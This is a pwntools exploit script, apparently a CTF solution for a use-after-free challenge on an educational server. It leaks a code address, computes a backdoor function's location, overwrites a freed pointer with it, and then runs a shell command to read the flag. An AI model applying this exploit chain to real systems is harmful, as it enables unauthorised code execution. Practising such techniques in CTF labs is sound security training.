'/ Use After Free /'
from pwn import *
context(arch = 'amd64', os = 'linux')
#r = process('./uaf')
r = remote('edu-ctf.csie.org', 10177)

r.sendafter('Size of your messege: ', str(16))
r.sendafter('Messege: ', 'a'*8 )
r.recvuntil('a'*8)
code_base = u64(r.recv(6) + b'\0\0') - 0x0a77
backdoor = code_base + 0x0ab5
success( "code_base = " + hex(code_base) )

r.sendafter('Size of your messege: ', str(16))
r.sendafter('Messege: ', b'a'*8 + p64(backdoor) )
r.sendafter('Size of your messege: ', str(0x40))
r.sendafter('Messege: ', ' ' )
r.recvline()

r.sendline('cat /home/`whoami`/flag')
r.interactive()
